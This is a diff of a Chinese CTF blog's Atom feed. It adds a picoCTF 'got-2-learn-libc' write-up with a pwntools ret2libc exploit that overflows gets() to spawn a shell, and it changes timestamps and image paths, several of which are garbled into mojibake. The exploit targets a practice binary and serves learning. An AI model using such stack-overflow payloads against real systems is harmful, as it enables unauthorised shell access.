@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-10-04T12:00:14.186Z</updated>
+  <updated>2018-10-04T12:00:16.000Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://iosmosis.github.io/2018/10/04/XJNUCTF-Writeup/"/>
     <id>http://iosmosis.github.io/2018/10/04/XJNUCTF-Writeup/</id>
     <published>2018-10-04T09:57:59.000Z</published>
-    <updated>2018-10-04T12:00:14.186Z</updated>
+    <updated>2018-10-04T12:00:16.000Z</updated>
     
     <content type="html"><![CDATA[<h3 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/1.png" alt="1"></p>
 <p>查看</p>
@@ -210,7 +210,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="http://iosmosis.github.io/2018/10/02/picoctf-Writeup/"/>
     <id>http://iosmosis.github.io/2018/10/02/picoctf-Writeup/</id>
     <published>2018-10-02T12:05:03.000Z</published>
-    <updated>2018-10-04T09:55:22.426Z</updated>
+    <updated>2018-10-05T06:27:40.000Z</updated>
     
     <content type="html"><![CDATA[<h3 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h3><p>查看程序源代码</p>
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -450,7 +450,7 @@ ios@ubuntu:~$
 <p>F5报错 </p>
 <p>修复办法 ：</p>
 <p>G跟进地址</p>
-<p><img src="/2018/10/02/picoctf-Writeup/C:/Users\TTTR\ios\source\_posts\picoctf-Writeup\10.jpg" alt="10"></p>
+<p><img src="/2018/10/02/picoctf-Writeup/10.jpg" alt="10"></p>
 <p>keypatch该指令 用nop填充</p>
 <p><img src="/2018/10/02/picoctf-Writeup/11.jpg" alt="11"></p>
 <p>再次按F5</p>
@@ -501,6 +501,96 @@ p<span class="token punctuation">.</span>recv<span class="token punctuation">(</
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
+<h3 id="got-2-learn-libc"><a href="#got-2-learn-libc" class="headerlink" title="got-2-learn-libc"></a>got-2-learn-libc</h3><p>检查保护</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec got2libc
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/got2libc'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+ubuntu@ubuntu:~$
+</code></pre>
+<p>开启PIE NX RELRO</p>
+<p>载入ida查看流程</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  __gid_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
+
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"puts: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>puts<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fflush %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fflush<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>read<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"write: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"useful_string: %p\n"</span><span class="token punctuation">,</span> useful_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>主流程打印了当前的一些地址  看到还打印了一个useful_string 我们跟进看下 是什么</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002030</span>                 public useful_string
+<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002030</span> useful_string   db <span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token number">0</span>          <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> main<span class="token operator">+</span>C9↑o
+<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002038</span>                 align 10h
+<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002038</span> _data           ends
+</code></pre>
+<p>看到存的binsh</p>
+<p>跟进vuln函数</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-9Ch]</span>
+
+  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在溢出</span>
+  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>漏洞点也很明显</p>
+<p>思路：</p>
+<p>由于程序打印了puts地址 所以可以根据puts_addr找到libc版本</p>
+<p>通过计算libc_base 从而计算出system_addr</p>
+<p>题目已给出/bin/sh地址所以我们可以直接构造payload</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'got2libc'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'got2libc'</span><span class="token punctuation">)</span>
+puts_plt_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+putsaddr <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+puts<span class="token operator">=</span> putsaddr<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">]</span>
+binsh<span class="token operator">=</span> putsaddr<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">:</span><span class="token number">128</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true">#puts_plt = 0xf7e0618</span>
+<span class="token comment" spellcheck="true">#puts_got = 0xf7e01fe4</span>
+<span class="token comment" spellcheck="true">#payload = 'A'*0x9C+'bbbb'+p32(puts_plt)+p32(0xf7e0803)+p32(puts_got)</span>
+
+<span class="token comment" spellcheck="true">#p.sendline(payload)</span>
+<span class="token comment" spellcheck="true">#log.info(p.recvuntil('Thanks! Exiting now...\n'))</span>
+<span class="token comment" spellcheck="true">#data = p.recvuntil('\n', drop=True)</span>
+<span class="token comment" spellcheck="true">#puts = u32(data.ljust(4,'\x00'))</span>
+
+system <span class="token operator">=</span> int<span class="token punctuation">(</span>puts<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x05fca0</span><span class="token operator">+</span><span class="token number">0x03ada0</span>
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x9C</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>int<span class="token punctuation">(</span>binsh<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>注意str与int的转换</p>
+<p>这里的system计算是通过<a href="https://libc.blukat.me" target="_blank" rel="external">https://libc.blukat.me</a></p>
+<p><img src="/2018/10/02/picoctf-Writeup/13.jpg" alt="13"></p>
+<p><img src="/2018/10/02/picoctf-Writeup/14.jpg" alt="14"></p>
+<p>成功拿到shell</p>
 ]]></content>
     
     <summary type="html">
@@ -514,10 +604,10 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   
   <entry>
     <title>网鼎杯部分PWN-Writeup</title>
-    <link href="http://iosmosis.github.io/2018/08/22/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%83%A8%E5%88%86PWN-Writeup/"/>
-    <id>http://iosmosis.github.io/2018/08/22/网鼎杯部分PWN-Writeup/</id>
+    <link href="http://iosmosis.github.io/2018/08/22/%E2%95%90%C2%B0%E2%95%A2%D0%B6%E2%96%92%D0%BD%E2%96%93%E2%94%90%E2%95%96%E2%95%93PWN-Writeup/"/>
+    <id>http://iosmosis.github.io/2018/08/22/═°╢ж▒н▓┐╖╓PWN-Writeup/</id>
     <published>2018-08-22T04:58:03.000Z</published>
-    <updated>2018-08-22T09:56:35.479Z</updated>
+    <updated>2018-08-22T09:56:36.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="第一场"><a href="#第一场" class="headerlink" title="第一场"></a>第一场</h2><h3 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h3><p>SSP leak flag</p>
 <p>这次学到了一个知识点 environ存在栈地址</p>
@@ -533,7 +623,7 @@ puts <span class="token operator">=</span> u64<span class="token punctuation">(<
 <span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
 </code></pre>
 <p>通过 puts_addr 查找libc版本</p>
-<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/2.jpg" alt="2"></p>
+<p><img src="/2018/08/22/═°╢ж▒н▓┐╖╓PWN-Writeup/网鼎杯部分PWN-Writeup/2.jpg" alt="2"></p>
 <h4 id="第二次-leak-environ"><a href="#第二次-leak-environ" class="headerlink" title="第二次 leak environ"></a>第二次 leak environ</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python">environ <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>
 payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
@@ -579,7 +669,7 @@ p<span class="token punctuation">.</span>sendline<span class="token punctuation"
 <span class="token keyword">print</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
 </code></pre>
 <p>得到flag</p>
-<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/3.jpg" alt="3"></p>
+<p><img src="/2018/08/22/═°╢ж▒н▓┐╖╓PWN-Writeup/网鼎杯部分PWN-Writeup/3.jpg" alt="3"></p>
 <h2 id="第二场"><a href="#第二场" class="headerlink" title="第二场"></a>第二场</h2><h3 id="easyFMT"><a href="#easyFMT" class="headerlink" title="easyFMT"></a>easyFMT</h3><p>检查保护</p>
 <p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec <span class="token function">fmt</span>
@@ -637,7 +727,7 @@ puts <span class="token operator">=</span> u32<span class="token punctuation">(<
 <span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
 </code></pre>
 <p>获取libc版本</p>
-<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/1.jpg" alt="1"></p>
+<p><img src="/2018/08/22/═°╢ж▒н▓┐╖╓PWN-Writeup/网鼎杯部分PWN-Writeup/1.jpg" alt="1"></p>
 <p>计算获得system_addr</p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python">system_addr<span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
@@ -697,10 +787,10 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   
   <entry>
     <title>西电线下赛PWN-writeup</title>
-    <link href="http://iosmosis.github.io/2018/07/23/%E8%A5%BF%E7%94%B5%E7%BA%BF%E4%B8%8B%E8%B5%9BPWN-writeup/"/>
-    <id>http://iosmosis.github.io/2018/07/23/西电线下赛PWN-writeup/</id>
+    <link href="http://iosmosis.github.io/2018/07/23/%E2%95%AC%D1%9E%E2%95%A1%D1%87%E2%95%A7%E2%96%80%E2%95%A7%E2%94%AC%E2%95%9A%E2%84%96PWN-writeup/"/>
+    <id>http://iosmosis.github.io/2018/07/23/╬ў╡ч╧▀╧┬╚№PWN-writeup/</id>
     <published>2018-07-22T18:25:32.000Z</published>
-    <updated>2018-07-24T16:09:29.031Z</updated>
+    <updated>2018-07-24T16:09:30.000Z</updated>
     
     <content type="html"><![CDATA[<p>比赛结束了…垃圾的我拿了第六 菜归菜 但是也要继续学习orz</p>
 <p>感谢每一位西电的学长</p>
@@ -766,7 +856,7 @@ p<span class="token punctuation">.</span>sendline<span class="token punctuation"
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <p>尝试运行</p>
-<p><img src="/2018/07/23/西电线下赛PWN-writeup/1.jpg" alt="1"></p>
+<p><img src="/2018/07/23/╬ў╡ч╧▀╧┬╚№PWN-writeup/西电线下赛PWN-writeup/1.jpg" alt="1"></p>
 <h2 id="PWN2-stack-relro"><a href="#PWN2-stack-relro" class="headerlink" title="PWN2  stack-relro"></a>PWN2  stack-relro</h2><p>感谢因幡师傅 感谢去去去师傅~</p>
 <p>顺便推一下如果你也喜欢CTF真的很推荐来西电 学长们很友好也很愿意耐心解答问题</p>
 <p>那我们继续看题</p>
@@ -887,7 +977,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <p>看到如果读入输入成功就执行strncpy()函数将栈中刚输入的字符串复制到堆中 由于char src大小固定所以这里会造成栈溢出</p>
 <p>那我们可以来算一下偏移</p>
 <p>在strncpy()函数处下断</p>
-<p><img src="/2018/07/23/西电线下赛PWN-writeup/2.jpg" alt="2"></p>
+<p><img src="/2018/07/23/╬ў╡ч╧▀╧┬╚№PWN-writeup/西电线下赛PWN-writeup/2.jpg" alt="2"></p>
 <p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">gdb-peda$ <span class="token function">file</span> relro
 Reading symbols from relro<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
@@ -1028,7 +1118,7 @@ p<span class="token punctuation">.</span>sendline<span class="token punctuation"
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <p>尝试运行</p>
-<p><img src="/2018/07/23/西电线下赛PWN-writeup/3.jpg" alt="3"></p>
+<p><img src="/2018/07/23/╬ў╡ч╧▀╧┬╚№PWN-writeup/西电线下赛PWN-writeup/3.jpg" alt="3"></p>
 ]]></content>
     
     <summary type="html">
@@ -1044,10 +1134,10 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   
   <entry>
     <title>heap-学习</title>
-    <link href="http://iosmosis.github.io/2018/07/18/heap-%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://iosmosis.github.io/2018/07/18/heap-学习/</id>
+    <link href="http://iosmosis.github.io/2018/07/18/heap-%E2%95%A4%D0%B7%E2%95%A7%E2%96%91/"/>
+    <id>http://iosmosis.github.io/2018/07/18/heap-╤з╧░/</id>
     <published>2018-07-18T09:12:30.000Z</published>
-    <updated>2018-07-22T19:43:37.888Z</updated>
+    <updated>2018-07-22T19:43:38.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>源代码</p>
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -1120,7 +1210,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 </code></pre>
 <p>漏洞存在于strcpy函数</p>
 <h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为该程序堆是连续分配的所以在内存结构上也是连续的</p>
-<p> <img src="/2018/07/18/heap-学习/1.png" alt="1"></p>
+<p> <img src="/2018/07/18/heap-╤з╧░/heap-学习/1.png" alt="1"></p>
 <p>所以我们需要溢出dest覆盖到v4接着修改nowinner为winner函数地址</p>
 <p>填充量= malloc(0x80u) +第二个chunk头0x8=136</p>
 <p>或者gdb调试</p>
@@ -1250,7 +1340,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="http://iosmosis.github.io/2018/07/16/QCTF-writeup/"/>
     <id>http://iosmosis.github.io/2018/07/16/QCTF-writeup/</id>
     <published>2018-07-16T03:30:02.000Z</published>
-    <updated>2018-07-16T03:30:53.998Z</updated>
+    <updated>2018-07-16T03:30:54.000Z</updated>
     
     <content type="html"><![CDATA[<p>垃圾的我被stack坑了许久</p>
 ]]></content>
@@ -1270,7 +1360,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/"/>
     <id>http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/</id>
     <published>2018-07-12T09:35:36.000Z</published>
-    <updated>2018-07-13T17:53:10.590Z</updated>
+    <updated>2018-07-13T17:53:12.000Z</updated>
     
     <content type="html"><![CDATA[<p>最近在看堆系列 最近的wp都是大家有疑惑 我自己也有点不明白的题目 所以再次记录</p>
 <h2 id="write432"><a href="#write432" class="headerlink" title="write432"></a>write432</h2><p>检查保护</p>
@@ -1720,7 +1810,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="http://iosmosis.github.io/2018/07/12/HITCON-Training-Writeup/"/>
     <id>http://iosmosis.github.io/2018/07/12/HITCON-Training-Writeup/</id>
     <published>2018-07-11T17:09:38.000Z</published>
-    <updated>2018-07-12T11:19:06.422Z</updated>
+    <updated>2018-07-12T11:19:08.000Z</updated>
     
     <content type="html"><![CDATA[<p>记录HITCON题目中遇到的问题</p>
 <h2 id="simplerop"><a href="#simplerop" class="headerlink" title="simplerop"></a>simplerop</h2><h4 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -1874,13 +1964,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
   
   <entry>
     <title>ROPgadget安装问题</title>
-    <link href="http://iosmosis.github.io/2018/07/05/ROPgadget%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/"/>
-    <id>http://iosmosis.github.io/2018/07/05/ROPgadget安装问题/</id>
+    <link href="http://iosmosis.github.io/2018/07/05/ROPgadget%E2%96%91%E2%96%93%E2%95%AB%E2%96%91%E2%95%AC%E2%95%A9%E2%95%A0%D1%82/"/>
+    <id>http://iosmosis.github.io/2018/07/05/ROPgadget░▓╫░╬╩╠т/</id>
     <published>2018-07-05T05:19:43.000Z</published>
-    <updated>2018-07-05T05:43:23.116Z</updated>
+    <updated>2018-07-05T05:43:24.000Z</updated>
     
     <content type="html"><![CDATA[<p>运行ROPgadget遇到这个错误</p>
-<p><img src="/2018/07/05/ROPgadget安装问题/1.jpg" alt="1"></p>
+<p><img src="/2018/07/05/ROPgadget░▓╫░╬╩╠т/ROPgadget安装问题/1.jpg" alt="1"></p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python">ERROR<span class="token punctuation">:</span> fail to load the dynamic library
 </code></pre>
@@ -1889,7 +1979,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p></p><p class="code-caption" data-lang="pyhton" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-pyhton"><code class="language-pyhton">find / -name 'libcapstone*'
 </code></pre>
-<p><img src="/2018/07/05/ROPgadget安装问题/2.jpg" alt="2"></p>
+<p><img src="/2018/07/05/ROPgadget░▓╫░╬╩╠т/ROPgadget安装问题/2.jpg" alt="2"></p>
 <p>找到so路径</p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>capstone<span class="token operator">/</span>libcapstone<span class="token punctuation">.</span>so
@@ -1906,7 +1996,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <span class="token keyword">print</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
 </code></pre>
 <p>得到当前python路径</p>
-<p><img src="/2018/07/05/ROPgadget安装问题/3.jpg" alt="3"></p>
+<p><img src="/2018/07/05/ROPgadget░▓╫░╬╩╠т/ROPgadget安装问题/3.jpg" alt="3"></p>
 <p>找到后</p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python">mv so库路径  python路径<span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>capstone文件夹下
@@ -1920,8 +2010,8 @@ ios@ubuntu<span class="token punctuation">:</span><span class="token operator">~
     <summary type="html">
     
       &lt;p&gt;运行ROPgadget遇到这个错误&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2018/07/05/ROPgadget安装问题/1.jpg&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;python&quot; data-l
+&lt;p&gt;&lt;img src=&quot;/2018/07/05/ROPgadget░▓╫░╬╩╠т/ROPgadget安装问题/1.jpg&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-la
     
     </summary>
     
@@ -1933,7 +2023,7 @@ ios@ubuntu<span class="token punctuation">:</span><span class="token operator">~
     <link href="http://iosmosis.github.io/2018/06/29/police-academy-Writeup/"/>
     <id>http://iosmosis.github.io/2018/06/29/police-academy-Writeup/</id>
     <published>2018-06-29T15:30:28.000Z</published>
-    <updated>2018-06-29T17:42:08.015Z</updated>
+    <updated>2018-06-29T17:42:10.000Z</updated>
     
     <content type="html"><![CDATA[<h3 id="走一下程序流程"><a href="#走一下程序流程" class="headerlink" title="走一下程序流程"></a>走一下程序流程</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ./police_academy
@@ -2231,7 +2321,7 @@ $
     <link href="http://iosmosis.github.io/2018/06/18/bamboofox-ret2syscall/"/>
     <id>http://iosmosis.github.io/2018/06/18/bamboofox-ret2syscall/</id>
     <published>2018-06-18T05:51:01.000Z</published>
-    <updated>2018-06-18T06:42:58.805Z</updated>
+    <updated>2018-06-18T06:43:00.000Z</updated>
     
     <content type="html"><![CDATA[<p>程序源码</p>
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -2458,10 +2548,10 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
   
   <entry>
     <title>全国中学生网络安全技术大赛-Writeup</title>
-    <link href="http://iosmosis.github.io/2018/06/12/%E5%85%A8%E5%9B%BD%E4%B8%AD%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-Writeup/"/>
-    <id>http://iosmosis.github.io/2018/06/12/全国中学生网络安全技术大赛-Writeup/</id>
